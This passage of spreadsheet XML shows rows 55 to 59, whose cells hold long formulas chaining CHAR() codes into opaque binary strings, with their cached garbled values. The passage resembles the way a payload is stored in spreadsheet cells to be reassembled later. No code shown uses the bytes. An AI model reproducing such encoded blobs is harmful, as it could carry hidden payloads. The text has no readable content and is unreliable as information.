CHAR(7)&amp;CHAR(4)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(110)&amp;CHAR(185)&amp;CHAR(36)&amp;CHAR(234)&amp;CHAR(211)&amp;CHAR(206)&amp;CHAR(162)&amp;CHAR(58)&amp;CHAR(69)&amp;CHAR(59)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(132)&amp;CHAR(202)&amp;CHAR(186)&amp;CHAR(231)&amp;CHAR(59)&amp;CHAR(93)&amp;CHAR(18)&amp;CHAR(41)&amp;CHAR(141)&amp;CHAR(177)&amp;CHAR(118)&amp;CHAR(221)&amp;CHAR(26)&amp;CHAR(160)&amp;CHAR(217)&amp;CHAR(172)&amp;CHAR(98)&amp;CHAR(212)&amp;CHAR(43)&amp;CHAR(89)&amp;CHAR(226)&amp;CHAR(23)&amp;CHAR(5)&amp;CHAR(182)&amp;CHAR(61)&amp;CHAR(207)&amp;CHAR(26)&amp;CHAR(119)&amp;CHAR(79)&amp;CHAR(125)&amp;CHAR(238)&amp;CHAR(27)&amp;CHAR(158)&amp;CHAR(221)&amp;CHAR(131)&amp;CHAR(217)&amp;CHAR(85)&amp;CHAR(188)&amp;CHAR(56)&amp;CHAR(177)&amp;CHAR(165)&amp;CHAR(104)&amp;CHAR(116)&amp;CHAR(76)&amp;CHAR(51)&amp;CHAR(174)&amp;CHAR(189)&amp;CHAR(146)&amp;CHAR(245)&amp;CHAR(182)&amp;CHAR(174)&amp;CHAR(196)&amp;CHAR(242)&amp;CHAR(86)&amp;CHAR(56)</f>
        <v>?—Œ‰‹ìÆQV|&lt;Î‘¥@_x000E_Vº­é) ÕV,Ö-F”c³íÑIùTJSò_x001F__x0016_b,Ý»y$_x0001_ì¼u/™lA—Ý€—ºÔ³ð_x0017_‡_x0007__x0004_Ïƒ¹_x001D_X¢E_x0018__x001A_‘.H#ˆ´_x0007_“âtÈ~¬_x0011_ôÂ—ž¢|Ã)ºÇÁm\5ïßÏç«ë°_x0014_ô˜úã›_x000F_‘1Ýœ5££®BžB[_x000F_t”¥Ô_x001E_ûT_x001B_\’¾!…K‹l¸Ïà0Y_x0005_×0dñ^g¿_x0013_ý–|§&lt;Ã_x0002_Î¬#ž/ÒG	_x000E_•¦Y r_x0016__x0007__x0004__x0008__x0002_Yn¹$êÓÎ¢:E;V!„Êºç;]_x0012_)±vÝ_x001A_ Ù¬bÔ+Yâ_x0017__x0005_¶=Ï_x001A_wO}î_x001B_žÝƒÙU¼8±¥htL3®½’õ¶®ÄòV8</v>
      </c>
      <c r="C55" t="str">
        <f>CHAR(188)&amp;CHAR(189)&amp;CHAR(205)&amp;CHAR(142)&amp;CHAR(247)&amp;CHAR(96)&amp;CHAR(251)&amp;CHAR(216)&amp;CHAR(220)&amp;CHAR(54)</f>
        <v>¼½ÍŽ÷`ûØÜ6</v>
      </c>
    </row>
    <row r="56" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B56" t="str">
        <f>CHAR(85)&amp;CHAR(55)&amp;CHAR(241)&amp;CHAR(202)&amp;CHAR(230)&amp;CHAR(18)&amp;CHAR(247)&amp;CHAR(64)&amp;CHAR(80)&amp;CHAR(181)&amp;CHAR(13)&amp;CHAR(221)&amp;CHAR(85)&amp;CHAR(68)&amp;CHAR(47)&amp;CHAR(153)&amp;CHAR(147)&amp;CHAR(206)&amp;CHAR(23)&amp;CHAR(66)&amp;CHAR(231)&amp;CHAR(2)&amp;CHAR(113)&amp;CHAR(8)&amp;CHAR(251)&amp;CHAR(86)&amp;CHAR(129)&amp;CHAR(158)&amp;CHAR(164)&amp;CHAR(187)&amp;CHAR(60)&amp;CHAR(132)&amp;CHAR(136)&amp;CHAR(144)&amp;CHAR(89)&amp;CHAR(69)&amp;CHAR(24)&amp;CHAR(248)&amp;CHAR(150)&amp;CHAR(25)&amp;CHAR(112)&amp;CHAR(16)&amp;CHAR(239)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(160)&amp;CHAR(132)&amp;CHAR(112)&amp;CHAR(221)&amp;CHAR(185)&amp;CHAR(209)&amp;CHAR(205)&amp;CHAR(30)&amp;CHAR(156)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(126)&amp;CHAR(186)&amp;CHAR(199)&amp;CHAR(249)&amp;CHAR(206)&amp;CHAR(102)&amp;CHAR(52)&amp;CHAR(12)&amp;CHAR(38)&amp;CHAR(97)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(42)&amp;CHAR(168)&amp;CHAR(222)&amp;CHAR(100)&amp;CHAR(211)&amp;CHAR(95)&amp;CHAR(18)&amp;CHAR(199)&amp;CHAR(255)&amp;CHAR(176)&amp;CHAR(60)&amp;CHAR(182)&amp;CHAR(245)&amp;CHAR(245)&amp;CHAR(143)&amp;CHAR(103)&amp;CHAR(226)&amp;CHAR(131)&amp;CHAR(128)&amp;CHAR(118)&amp;CHAR(48)&amp;CHAR(10)&amp;CHAR(182)&amp;CHAR(16)&amp;CHAR(87)&amp;CHAR(215)&amp;CHAR(24)&amp;CHAR(249)&amp;CHAR(27)&amp;CHAR(224)&amp;CHAR(242)&amp;CHAR(158)&amp;CHAR(12)&amp;CHAR(167)&amp;CHAR(243)&amp;CHAR(247)&amp;CHAR(37)&amp;CHAR(210)&amp;CHAR(144)&amp;CHAR(18)&amp;CHAR(122)&amp;CHAR(171)&amp;CHAR(26)&amp;CHAR(1)&amp;CHAR(221)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(16)&amp;CHAR(107)&amp;CHAR(32)&amp;CHAR(236)&amp;CHAR(126)&amp;CHAR(190)&amp;CHAR(12)&amp;CHAR(40)&amp;CHAR(54)&amp;CHAR(36)&amp;CHAR(119)&amp;CHAR(202)&amp;CHAR(53)&amp;CHAR(81)&amp;CHAR(160)&amp;CHAR(86)&amp;CHAR(61)&amp;CHAR(184)&amp;CHAR(165)&amp;CHAR(72)&amp;CHAR(223)&amp;CHAR(25)&amp;CHAR(7)&amp;CHAR(21)&amp;CHAR(92)&amp;CHAR(227)&amp;CHAR(231)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(193)&amp;CHAR(109)&amp;CHAR(63)&amp;CHAR(134)&amp;CHAR(167)&amp;CHAR(207)&amp;CHAR(20)&amp;CHAR(55)&amp;CHAR(136)&amp;CHAR(252)&amp;CHAR(42)&amp;CHAR(201)&amp;CHAR(196)&amp;CHAR(16)&amp;CHAR(155)&amp;CHAR(125)&amp;CHAR(251)&amp;CHAR(36)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(175)&amp;CHAR(39)&amp;CHAR(190)&amp;CHAR(156)&amp;CHAR(225)&amp;CHAR(113)&amp;CHAR(223)&amp;CHAR(58)&amp;CHAR(194)&amp;CHAR(29)&amp;CHAR(43)&amp;CHAR(223)&amp;CHAR(223)&amp;CHAR(123)&amp;CHAR(171)&amp;CHAR(122)&amp;CHAR(10)&amp;CHAR(112)&amp;CHAR(188)&amp;CHAR(105)&amp;CHAR(165)&amp;CHAR(139)&amp;CHAR(122)&amp;CHAR(108)&amp;CHAR(145)&amp;CHAR(186)&amp;CHAR(7)&amp;CHAR(99)&amp;CHAR(207)&amp;CHAR(236)&amp;CHAR(131)&amp;CHAR(243)&amp;CHAR(250)&amp;CHAR(97)&amp;CHAR(115)&amp;CHAR(42)&amp;CHAR(173)&amp;CHAR(164)&amp;CHAR(217)&amp;CHAR(174)&amp;CHAR(54)&amp;CHAR(154)&amp;CHAR(41)&amp;CHAR(17)&amp;CHAR(226)&amp;CHAR(25)&amp;CHAR(198)&amp;CHAR(253)&amp;CHAR(251)&amp;CHAR(216)&amp;CHAR(97)&amp;CHAR(118)&amp;CHAR(135)&amp;CHAR(62)&amp;CHAR(42)&amp;CHAR(17)&amp;CHAR(17)&amp;CHAR(211)&amp;CHAR(176)&amp;CHAR(102)&amp;CHAR(199)&amp;CHAR(157)&amp;CHAR(128)&amp;CHAR(64)&amp;CHAR(210)&amp;CHAR(149)&amp;CHAR(206)&amp;CHAR(143)&amp;CHAR(185)&amp;CHAR(205)&amp;CHAR(114)&amp;CHAR(109)&amp;CHAR(82)&amp;CHAR(235)&amp;CHAR(19)&amp;CHAR(133)&amp;CHAR(50)&amp;CHAR(81)&amp;CHAR(247)&amp;CHAR(58)&amp;CHAR(39)&amp;CHAR(163)&amp;CHAR(19)&amp;CHAR(96)&amp;CHAR(220)&amp;CHAR(43)&amp;CHAR(11)&amp;CHAR(8)&amp;CHAR(198)&amp;CHAR(143)&amp;CHAR(213)</f>
        <v>U7ñÊæ_x0012_÷@Pµ_x000D_ÝUD/™“Î_x0017_Bç_x0002_q_x0008_ûVž¤»&lt;„ˆYE_x0018_ø–_x0019_p_x0010_ïUW „pÝ¹ÑÍ_x001E_œ‚N~ºÇùÎf4_x000C_&amp;a_x0006__x000F_*¨ÞdÓ__x0012_Çÿ°&lt;¶õõgâƒ€v0
¶_x0010_W×_x0018_ù_x001B_àòž_x000C_§ó÷%Ò_x0012_z«_x001A__x0001_Ý_x000B__x0005__x0010_k ì~¾_x000C_(6$wÊ5Q V=¸¥Hß_x0019__x0007__x0015_\ãç_x0003__x0003_Ám?†§Ï_x0014_7ˆü*ÉÄ_x0010_›}û$_x0006__x0003_¯'¾œáqß:Â_x001D_+ßß{«z
p¼i¥‹zl‘º_x0007_cÏìƒóúas*­¤Ù®6š)_x0011_â_x0019_ÆýûØav‡&gt;*_x0011__x0011_Ó°fÇ€@Ò•Î¹ÍrmRë_x0013_…2Q÷:'£_x0013_`Ü+_x000B__x0008_ÆÕ</v>
      </c>
      <c r="C56" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(242)&amp;CHAR(104)&amp;CHAR(54)&amp;CHAR(149)&amp;CHAR(184)&amp;CHAR(187)&amp;CHAR(200)&amp;CHAR(65)</f>
        <v>Íëòh6•¸»ÈA</v>
      </c>
    </row>
    <row r="57" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B57" t="str">
        <f>CHAR(131)&amp;CHAR(132)&amp;CHAR(71)&amp;CHAR(198)&amp;CHAR(229)&amp;CHAR(209)&amp;CHAR(40)&amp;CHAR(246)&amp;CHAR(84)&amp;CHAR(63)&amp;CHAR(213)&amp;CHAR(62)&amp;CHAR(74)&amp;CHAR(134)&amp;CHAR(28)&amp;CHAR(224)&amp;CHAR(110)&amp;CHAR(22)&amp;CHAR(128)&amp;CHAR(131)&amp;CHAR(213)&amp;CHAR(84)&amp;CHAR(94)&amp;CHAR(15)&amp;CHAR(40)&amp;CHAR(198)&amp;CHAR(140)&amp;CHAR(225)&amp;CHAR(231)&amp;CHAR(109)&amp;CHAR(63)&amp;CHAR(75)&amp;CHAR(114)&amp;CHAR(43)&amp;CHAR(144)&amp;CHAR(65)&amp;CHAR(64)&amp;CHAR(10)&amp;CHAR(25)&amp;CHAR(76)&amp;CHAR(115)&amp;CHAR(138)&amp;CHAR(8)&amp;CHAR(67)&amp;CHAR(65)&amp;CHAR(172)&amp;CHAR(240)&amp;CHAR(54)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(168)&amp;CHAR(82)&amp;CHAR(31)&amp;CHAR(62)&amp;CHAR(68)&amp;CHAR(53)&amp;CHAR(40)&amp;CHAR(27)&amp;CHAR(9)&amp;CHAR(157)&amp;CHAR(157)&amp;CHAR(81)&amp;CHAR(128)&amp;CHAR(178)&amp;CHAR(47)&amp;CHAR(35)&amp;CHAR(47)&amp;CHAR(89)&amp;CHAR(47)&amp;CHAR(29)&amp;CHAR(241)&amp;CHAR(66)&amp;CHAR(158)&amp;CHAR(77)&amp;CHAR(131)&amp;CHAR(70)&amp;CHAR(97)&amp;CHAR(179)&amp;CHAR(110)&amp;CHAR(247)&amp;CHAR(40)&amp;CHAR(33)&amp;CHAR(138)&amp;CHAR(253)&amp;CHAR(211)&amp;CHAR(146)&amp;CHAR(95)&amp;CHAR(66)&amp;CHAR(186)&amp;CHAR(171)&amp;CHAR(211)&amp;CHAR(99)&amp;CHAR(52)&amp;CHAR(253)&amp;CHAR(84)&amp;CHAR(125)&amp;CHAR(32)&amp;CHAR(123)&amp;CHAR(206)&amp;CHAR(220)&amp;CHAR(179)&amp;CHAR(153)&amp;CHAR(17)&amp;CHAR(131)&amp;CHAR(88)&amp;CHAR(110)&amp;CHAR(3)&amp;CHAR(184)&amp;CHAR(65)&amp;CHAR(108)&amp;CHAR(211)&amp;CHAR(178)&amp;CHAR(200)&amp;CHAR(194)&amp;CHAR(42)&amp;CHAR(170)&amp;CHAR(94)&amp;CHAR(129)&amp;CHAR(224)&amp;CHAR(7)&amp;CHAR(13)&amp;CHAR(60)&amp;CHAR(18)&amp;CHAR(108)&amp;CHAR(153)&amp;CHAR(254)&amp;CHAR(10)&amp;CHAR(37)&amp;CHAR(132)&amp;CHAR(53)&amp;CHAR(88)&amp;CHAR(163)&amp;CHAR(78)&amp;CHAR(206)&amp;CHAR(193)&amp;CHAR(184)&amp;CHAR(1)&amp;CHAR(149)&amp;CHAR(207)&amp;CHAR(181)&amp;CHAR(162)&amp;CHAR(254)&amp;CHAR(63)&amp;CHAR(173)&amp;CHAR(142)&amp;CHAR(193)&amp;CHAR(131)&amp;CHAR(89)&amp;CHAR(195)&amp;CHAR(195)&amp;CHAR(243)&amp;CHAR(131)&amp;CHAR(76)&amp;CHAR(15)&amp;CHAR(236)&amp;CHAR(64)&amp;CHAR(175)&amp;CHAR(78)&amp;CHAR(120)&amp;CHAR(170)&amp;CHAR(7)&amp;CHAR(110)&amp;CHAR(124)&amp;CHAR(60)&amp;CHAR(42)&amp;CHAR(238)&amp;CHAR(149)&amp;CHAR(35)&amp;CHAR(137)&amp;CHAR(129)&amp;CHAR(12)&amp;CHAR(16)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(178)&amp;CHAR(124)&amp;CHAR(8)&amp;CHAR(196)&amp;CHAR(141)&amp;CHAR(14)&amp;CHAR(196)&amp;CHAR(179)&amp;CHAR(175)&amp;CHAR(45)&amp;CHAR(66)&amp;CHAR(252)&amp;CHAR(20)&amp;CHAR(22)&amp;CHAR(1)&amp;CHAR(100)&amp;CHAR(42)&amp;CHAR(14)&amp;CHAR(193)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(59)&amp;CHAR(112)&amp;CHAR(31)&amp;CHAR(158)&amp;CHAR(100)&amp;CHAR(138)&amp;CHAR(215)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(124)&amp;CHAR(175)&amp;CHAR(241)&amp;CHAR(234)&amp;CHAR(97)&amp;CHAR(188)&amp;CHAR(47)&amp;CHAR(38)&amp;CHAR(84)&amp;CHAR(197)&amp;CHAR(147)&amp;CHAR(234)&amp;CHAR(69)&amp;CHAR(148)&amp;CHAR(68)&amp;CHAR(8)&amp;CHAR(21)&amp;CHAR(176)&amp;CHAR(126)&amp;CHAR(203)&amp;CHAR(70)&amp;CHAR(71)&amp;CHAR(230)&amp;CHAR(175)&amp;CHAR(107)&amp;CHAR(192)&amp;CHAR(216)&amp;CHAR(191)&amp;CHAR(123)&amp;CHAR(181)&amp;CHAR(110)&amp;CHAR(189)&amp;CHAR(57)&amp;CHAR(158)&amp;CHAR(9)&amp;CHAR(96)&amp;CHAR(229)&amp;CHAR(198)&amp;CHAR(97)&amp;CHAR(18)&amp;CHAR(216)&amp;CHAR(48)&amp;CHAR(51)&amp;CHAR(186)&amp;CHAR(157)&amp;CHAR(248)&amp;CHAR(166)&amp;CHAR(181)&amp;CHAR(140)&amp;CHAR(49)&amp;CHAR(238)</f>
        <v>ƒ„GÆåÑ(öT?Õ&gt;J†_x001C_àn_x0016_€ƒÕT^_x000F_(ÆŒáçm?Kr+A@
_x0019_LsŠ_x0008_CA¬ð6ÐÖ¨R_x001F_&gt;D5(_x001B_	Q€²/#/Y/_x001D_ñBžMƒFa³n÷(!ŠýÓ’_Bº«Óc4ýT} {ÎÜ³™_x0011_ƒXn_x0003_¸AlÓ²ÈÂ*ª^à_x0007__x000D_&lt;_x0012_l™þ
%„5X£NÎÁ¸_x0001_•Ïµ¢þ?­ŽÁƒYÃÃóƒL_x000F_ì@¯Nxª_x0007_n|&lt;*î•#‰_x000C__x0010_ŽJ²|_x0008_Ä_x000E_Ä³¯-Bü_x0014__x0016__x0001_d*_x000E_Á»_x0007_;p_x001F_ždŠ×RŸ|¯ñêa¼/&amp;TÅ“êE”D_x0008__x0015_°~ËFGæ¯kÀØ¿{µn½9ž	`åÆa_x0012_Ø03ºø¦µŒ1î</v>
      </c>
      <c r="C57" t="str">
        <f>CHAR(191)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(181)&amp;CHAR(121)&amp;CHAR(35)&amp;CHAR(126)&amp;CHAR(239)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>¿ë÷µy#~ï»ë</v>
      </c>
    </row>
    <row r="58" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B58" t="str">
        <f>CHAR(119)&amp;CHAR(75)&amp;CHAR(173)&amp;CHAR(105)&amp;CHAR(189)&amp;CHAR(246)&amp;CHAR(89)&amp;CHAR(79)&amp;CHAR(32)&amp;CHAR(178)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(192)&amp;CHAR(79)&amp;CHAR(182)&amp;CHAR(215)&amp;CHAR(227)&amp;CHAR(75)&amp;CHAR(151)&amp;CHAR(48)&amp;CHAR(2)&amp;CHAR(231)&amp;CHAR(6)&amp;CHAR(253)&amp;CHAR(153)&amp;CHAR(169)&amp;CHAR(1)&amp;CHAR(153)&amp;CHAR(94)&amp;CHAR(183)&amp;CHAR(2)&amp;CHAR(245)&amp;CHAR(129)&amp;CHAR(239)&amp;CHAR(245)&amp;CHAR(62)&amp;CHAR(11)&amp;CHAR(29)&amp;CHAR(56)&amp;CHAR(138)&amp;CHAR(232)&amp;CHAR(147)&amp;CHAR(32)&amp;CHAR(36)&amp;CHAR(197)&amp;CHAR(72)&amp;CHAR(153)&amp;CHAR(240)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(21)&amp;CHAR(80)&amp;CHAR(143)&amp;CHAR(239)&amp;CHAR(95)&amp;CHAR(205)&amp;CHAR(249)&amp;CHAR(191)&amp;CHAR(128)&amp;CHAR(175)&amp;CHAR(190)&amp;CHAR(55)&amp;CHAR(93)&amp;CHAR(182)&amp;CHAR(122)&amp;CHAR(164)&amp;CHAR(23)&amp;CHAR(116)&amp;CHAR(145)&amp;CHAR(226)&amp;CHAR(2)&amp;CHAR(113)&amp;CHAR(77)&amp;CHAR(41)&amp;CHAR(37)&amp;CHAR(191)&amp;CHAR(12)&amp;CHAR(170)&amp;CHAR(181)&amp;CHAR(86)&amp;CHAR(237)&amp;CHAR(98)&amp;CHAR(253)&amp;CHAR(111)&amp;CHAR(23)&amp;CHAR(241)&amp;CHAR(108)&amp;CHAR(205)&amp;CHAR(49)&amp;CHAR(46)&amp;CHAR(242)&amp;CHAR(82)&amp;CHAR(123)&amp;CHAR(163)&amp;CHAR(51)&amp;CHAR(253)&amp;CHAR(18)&amp;CHAR(31)&amp;CHAR(90)&amp;CHAR(99)&amp;CHAR(85)&amp;CHAR(2)&amp;CHAR(134)&amp;CHAR(98)&amp;CHAR(194)&amp;CHAR(35)&amp;CHAR(21)&amp;CHAR(140)&amp;CHAR(185)&amp;CHAR(51)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(3)&amp;CHAR(114)&amp;CHAR(177)&amp;CHAR(241)&amp;CHAR(151)&amp;CHAR(127)&amp;CHAR(10)&amp;CHAR(223)&amp;CHAR(82)&amp;CHAR(202)&amp;CHAR(11)&amp;CHAR(101)&amp;CHAR(90)&amp;CHAR(211)&amp;CHAR(167)&amp;CHAR(75)&amp;CHAR(185)&amp;CHAR(211)&amp;CHAR(17)&amp;CHAR(253)&amp;CHAR(11)&amp;CHAR(227)&amp;CHAR(5)&amp;CHAR(115)&amp;CHAR(77)&amp;CHAR(19)&amp;CHAR(108)&amp;CHAR(46)&amp;CHAR(37)&amp;CHAR(217)&amp;CHAR(60)&amp;CHAR(50)&amp;CHAR(2)&amp;CHAR(25)&amp;CHAR(188)&amp;CHAR(72)&amp;CHAR(19)&amp;CHAR(129)&amp;CHAR(200)&amp;CHAR(97)&amp;CHAR(156)&amp;CHAR(131)&amp;CHAR(115)&amp;CHAR(1)&amp;CHAR(42)&amp;CHAR(165)&amp;CHAR(238)&amp;CHAR(133)&amp;CHAR(151)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(59)&amp;CHAR(159)&amp;CHAR(2)&amp;CHAR(53)&amp;CHAR(215)&amp;CHAR(156)&amp;CHAR(24)&amp;CHAR(74)&amp;CHAR(150)&amp;CHAR(58)&amp;CHAR(78)&amp;CHAR(140)&amp;CHAR(107)&amp;CHAR(166)&amp;CHAR(147)&amp;CHAR(78)&amp;CHAR(235)&amp;CHAR(131)&amp;CHAR(78)&amp;CHAR(211)&amp;CHAR(24)&amp;CHAR(132)&amp;CHAR(147)&amp;CHAR(182)&amp;CHAR(210)&amp;CHAR(162)&amp;CHAR(53)&amp;CHAR(194)&amp;CHAR(35)&amp;CHAR(191)&amp;CHAR(64)&amp;CHAR(67)&amp;CHAR(73)&amp;CHAR(228)&amp;CHAR(154)&amp;CHAR(231)&amp;CHAR(25)&amp;CHAR(178)&amp;CHAR(16)&amp;CHAR(105)&amp;CHAR(37)&amp;CHAR(176)&amp;CHAR(114)&amp;CHAR(204)&amp;CHAR(105)&amp;CHAR(99)&amp;CHAR(252)&amp;CHAR(227)&amp;CHAR(60)&amp;CHAR(63)&amp;CHAR(40)&amp;CHAR(241)&amp;CHAR(224)&amp;CHAR(49)&amp;CHAR(51)&amp;CHAR(229)&amp;CHAR(71)&amp;CHAR(212)&amp;CHAR(156)&amp;CHAR(187)&amp;CHAR(80)&amp;CHAR(172)&amp;CHAR(155)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(179)&amp;CHAR(122)&amp;CHAR(145)&amp;CHAR(97)&amp;CHAR(49)&amp;CHAR(238)&amp;CHAR(12)&amp;CHAR(176)&amp;CHAR(135)&amp;CHAR(43)&amp;CHAR(187)&amp;CHAR(102)&amp;CHAR(40)&amp;CHAR(125)&amp;CHAR(204)&amp;CHAR(16)&amp;CHAR(45)&amp;CHAR(168)&amp;CHAR(173)&amp;CHAR(155)&amp;CHAR(166)&amp;CHAR(53)&amp;CHAR(107)&amp;CHAR(30)</f>
        <v>wK­i½öYO ²_x0002_YÀO¶×ãK—0_x0002_ç_x0006_ý™©_x0001_™^·_x0002_õïõ&gt;_x000B__x001D_8Šè“ $ÅH™ð_x0004_ƒ_x0002__x0005__x0004__x0015_Pï_Íù¿€¯¾7]¶z¤_x0017_t‘â_x0002_qM)%¿_x000C_ªµVíbýo_x0017_ñlÍ1.òR{£3ý_x0012__x001F_ZcU_x0002_†bÂ#_x0015_Œ¹3]ô_x0003_r±ñ—
ßRÊ_x000B_eZÓ§K¹Ó_x0011_ý_x000B_ã_x0005_sM_x0013_l.%Ù&lt;2_x0002__x0019_¼H_x0013_Èaœƒs_x0001_*¥î…—u0;Ÿ_x0002_5×œ_x0018_J–:NŒk¦“NëƒNÓ_x0018_„“¶Ò¢5Â#¿@CIäšç_x0019_²_x0010_i%°rÌicüã&lt;?(ñà13åGÔœ»P¬›_x000D_.³z‘a1î_x000C_°‡+»f(}Ì_x0010_-¨­›¦5k_x001E_</v>
      </c>
      <c r="C58" t="str">
        <f>CHAR(146)&amp;CHAR(181)&amp;CHAR(127)&amp;CHAR(58)&amp;CHAR(232)&amp;CHAR(195)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(181)</f>
        <v>’µ:èÃ»ë÷µ</v>
      </c>
    </row>
    <row r="59" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B59" t="str">
        <f>CHAR(34)&amp;CHAR(129)&amp;CHAR(149)&amp;CHAR(42)&amp;CHAR(228)&amp;CHAR(45)&amp;CHAR(113)&amp;CHAR(31)&amp;CHAR(229)&amp;CHAR(212)&amp;CHAR(195)&amp;CHAR(168)&amp;CHAR(139)&amp;CHAR(107)&amp;CHAR(31)&amp;CHAR(90)&amp;CHAR(66)&amp;CHAR(255)&amp;CHAR(45)&amp;CHAR(67)&amp;CHAR(246)&amp;CHAR(26)&amp;CHAR(98)&amp;CHAR(212)&amp;CHAR(44)&amp;CHAR(202)&amp;CHAR(236)&amp;CHAR(166)&amp;CHAR(35)&amp;CHAR(216)&amp;CHAR(112)&amp;CHAR(129)&amp;CHAR(149)&amp;CHAR(189)&amp;CHAR(167)&amp;CHAR(12)&amp;CHAR(251)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(70)&amp;CHAR(210)&amp;CHAR(202)&amp;CHAR(133)&amp;CHAR(65)&amp;CHAR(241)&amp;CHAR(226)&amp;CHAR(97)&amp;CHAR(144)&amp;CHAR(62)&amp;CHAR(49)&amp;CHAR(16)&amp;CHAR(70)&amp;CHAR(35)&amp;CHAR(114)&amp;CHAR(233)&amp;CHAR(203)&amp;CHAR(179)&amp;CHAR(38)&amp;CHAR(61)&amp;CHAR(24)&amp;CHAR(111)&amp;CHAR(171)&amp;CHAR(252)&amp;CHAR(15)&amp;CHAR(112)&amp;CHAR(152)&amp;CHAR(84)&amp;CHAR(44)&amp;CHAR(5)&amp;CHAR(216)&amp;CHAR(239)&amp;CHAR(1)&amp;CHAR(55)&amp;CHAR(171)&amp;CHAR(216)&amp;CHAR(194)&amp;CHAR(68)&amp;CHAR(15)&amp;CHAR(52)&amp;CHAR(134)&amp;CHAR(105)&amp;CHAR(178)&amp;CHAR(127)&amp;CHAR(157)&amp;CHAR(62)&amp;CHAR(167)&amp;CHAR(128)&amp;CHAR(44)&amp;CHAR(30)&amp;CHAR(12)&amp;CHAR(98)&amp;CHAR(191)&amp;CHAR(147)&amp;CHAR(117)&amp;CHAR(15)&amp;CHAR(126)&amp;CHAR(244)&amp;CHAR(180)&amp;CHAR(143)&amp;CHAR(87)&amp;CHAR(228)&amp;CHAR(250)&amp;CHAR(144)&amp;CHAR(47)&amp;CHAR(129)&amp;CHAR(109)&amp;CHAR(70)&amp;CHAR(158)&amp;CHAR(66)&amp;CHAR(84)&amp;CHAR(103)&amp;CHAR(42)&amp;CHAR(46)&amp;CHAR(177)&amp;CHAR(183)&amp;CHAR(42)&amp;CHAR(94)&amp;CHAR(162)&amp;CHAR(133)&amp;CHAR(235)&amp;CHAR(142)&amp;CHAR(231)&amp;CHAR(225)&amp;CHAR(219)&amp;CHAR(1)&amp;CHAR(47)&amp;CHAR(199)&amp;CHAR(237)&amp;CHAR(178)&amp;CHAR(35)&amp;CHAR(146)&amp;CHAR(20)&amp;CHAR(101)&amp;CHAR(99)&amp;CHAR(247)&amp;CHAR(248)&amp;CHAR(197)&amp;CHAR(27)&amp;CHAR(42)&amp;CHAR(205)&amp;CHAR(208)&amp;CHAR(195)&amp;CHAR(201)&amp;CHAR(253)&amp;CHAR(66)&amp;CHAR(73)&amp;CHAR(61)&amp;CHAR(32)&amp;CHAR(176)&amp;CHAR(193)&amp;CHAR(141)&amp;CHAR(181)&amp;CHAR(250)&amp;CHAR(234)&amp;CHAR(245)&amp;CHAR(143)&amp;CHAR(107)&amp;CHAR(43)&amp;CHAR(116)&amp;CHAR(91)&amp;CHAR(211)&amp;CHAR(70)&amp;CHAR(21)&amp;CHAR(144)&amp;CHAR(43)&amp;CHAR(88)&amp;CHAR(197)&amp;CHAR(107)&amp;CHAR(145)&amp;CHAR(125)&amp;CHAR(65)&amp;CHAR(121)&amp;CHAR(255)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(3)&amp;CHAR(199)&amp;CHAR(81)&amp;CHAR(117)&amp;CHAR(54)&amp;CHAR(41)&amp;CHAR(21)&amp;CHAR(184)&amp;CHAR(238)&amp;CHAR(163)&amp;CHAR(118)&amp;CHAR(36)&amp;CHAR(124)&amp;CHAR(69)&amp;CHAR(184)&amp;CHAR(105)&amp;CHAR(181)&amp;CHAR(103)&amp;CHAR(192)&amp;CHAR(29)&amp;CHAR(43)&amp;CHAR(1)&amp;CHAR(203)&amp;CHAR(137)&amp;CHAR(237)&amp;CHAR(59)&amp;CHAR(77)&amp;CHAR(189)&amp;CHAR(133)&amp;CHAR(56)&amp;CHAR(225)&amp;CHAR(97)&amp;CHAR(120)&amp;CHAR(141)&amp;CHAR(104)&amp;CHAR(216)&amp;CHAR(5)&amp;CHAR(60)&amp;CHAR(234)&amp;CHAR(144)&amp;CHAR(209)&amp;CHAR(8)&amp;CHAR(17)&amp;CHAR(129)&amp;CHAR(190)&amp;CHAR(225)&amp;CHAR(227)&amp;CHAR(174)&amp;CHAR(100)&amp;CHAR(167)&amp;CHAR(81)&amp;CHAR(135)&amp;CHAR(103)&amp;CHAR(50)&amp;CHAR(104)&amp;CHAR(2)&amp;CHAR(222)&amp;CHAR(155)&amp;CHAR(73)&amp;CHAR(106)&amp;CHAR(135)&amp;CHAR(82)&amp;CHAR(150)&amp;CHAR(243)&amp;CHAR(156)&amp;CHAR(131)&amp;CHAR(73)&amp;CHAR(80)&amp;CHAR(168)&amp;CHAR(129)&amp;CHAR(32)&amp;CHAR(172)&amp;CHAR(126)&amp;CHAR(224)&amp;CHAR(205)&amp;CHAR(34)&amp;CHAR(212)&amp;CHAR(63)&amp;CHAR(169)&amp;CHAR(116)</f>
